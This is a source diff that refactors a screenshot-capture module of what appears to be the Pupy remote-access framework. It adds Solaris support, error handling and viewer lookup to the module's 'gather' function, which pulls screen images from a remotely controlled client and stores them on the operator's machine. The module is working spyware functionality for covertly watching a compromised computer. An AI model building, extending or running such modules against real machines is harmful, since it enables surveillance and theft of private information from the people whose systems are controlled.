@@ -30,36 +30,42 @@
 # POSSIBILITY OF SUCH DAMAGE
 # --------------------------------------------------------------
 
-from pupylib.PupyModule import *
+from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 from pupylib.PupyConfig import PupyConfig
-from os import path
 
-import datetime
+import os
 import subprocess
+
 
 __class_name__="Screenshoter"
 
 
-@config(cat="gather",compatibilities=['windows', 'linux', 'darwin'])
+@config(cat="gather",compatibilities=['windows', 'linux', 'darwin', 'solaris'])
 class Screenshoter(PupyModule):
     """ take a screenshot :) """
 
-    dependencies = ['mss', 'screenshot']
+    dependencies = [
+        'mss', 'screenshot', 'png'
+    ]
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='screenshot', description=self.__doc__)
-        self.arg_parser.add_argument('-e', '--enum', action='store_true', help='enumerate screen')
-        self.arg_parser.add_argument('-s', '--screen', type=int, default=None, help='take a screenshot on a specific screen (default all screen on one screenshot)')
-        self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open the default image viewer on the screenshot for preview')
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='screenshot', description=cls.__doc__)
+        cls.arg_parser.add_argument('-e', '--enum', action='store_true', help='enumerate screen')
+        cls.arg_parser.add_argument('-s', '--screen', type=int, default=None, help='take a screenshot on a specific screen (default all screen on one screenshot)')
+        cls.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open the default image viewer on the screenshot for preview')
 
     def run(self, args):
-        rscreenshot = self.client.conn.modules['screenshot']
-        if self.client.is_android()==True:
+        screens = self.client.remote('screenshot', 'screens')
+        screenshot = self.client.remote('screenshot', 'screenshot')
+
+        if self.client.is_android():
             self.error("Android target, not implemented yet...")
+
         else:
             if args.enum:
                 self.rawlog('{:>2} {:>9} {:>9}\n'.format('IDX', 'SIZE', 'LEFT'))
-                for i, screen in enumerate(rscreenshot.screens()):
+                for i, screen in enumerate(screens()):
                     if not (screen['width'] and screen['height']):
                         continue
 
@@ -70,21 +76,38 @@ class Screenshoter(PupyModule):
                 return
 
             config = self.client.pupsrv.config or PupyConfig()
-            folder = config.get_folder('screenshots', {'%c': self.client.short_name()})
+            filepath_base = config.get_file('screenshots', {'%c': self.client.short_name()})
 
-            rscreenshot.takeScreenshot()
-            screenshots, error = rscreenshot.screenshot(args.screen)
+            try:
+                screenshots, error = screenshot(args.screen)
+            except Exception, e:
+                self.error('Impossible to take a screenshot ("{0}"). Abording...'.format(e))
+                return -1
             if not screenshots:
                 self.error(error)
+                return -1
             else:
                 self.success('number of monitor detected: %s' % str(len(screenshots)))
 
                 for i, screenshot in enumerate(screenshots):
-                    filepath = path.join(folder, str(datetime.datetime.now()).replace(" ","_").replace(":","-")+'-'+str(i)+".png")
+                    filepath = filepath_base + '-{}.png'.format(i)
                     with open(filepath, 'w') as out:
                         out.write(screenshot)
                         self.success(filepath)
 
                     if args.view:
-                        viewer = config.get('default_viewers', 'image_viewer')
-                        subprocess.Popen([viewer, filepath])
+                        viewer = config.get('default_viewers', 'image_viewer') or 'xdg-open'
+
+                        found = False
+                        for p in os.environ.get('PATH', '').split(':'):
+                            if os.path.exists(os.path.join(p, viewer)):
+                                with open(os.devnull, 'w') as DEVNULL:
+                                    subprocess.Popen(
+                                        [viewer, filepath],
+                                        stdin=DEVNULL, stdout=DEVNULL, stderr=DEVNULL)
+
+                                found = True
+                                break
+
+                        if not found:
+                            self.error('Default viewer not found: %s' % viewer)
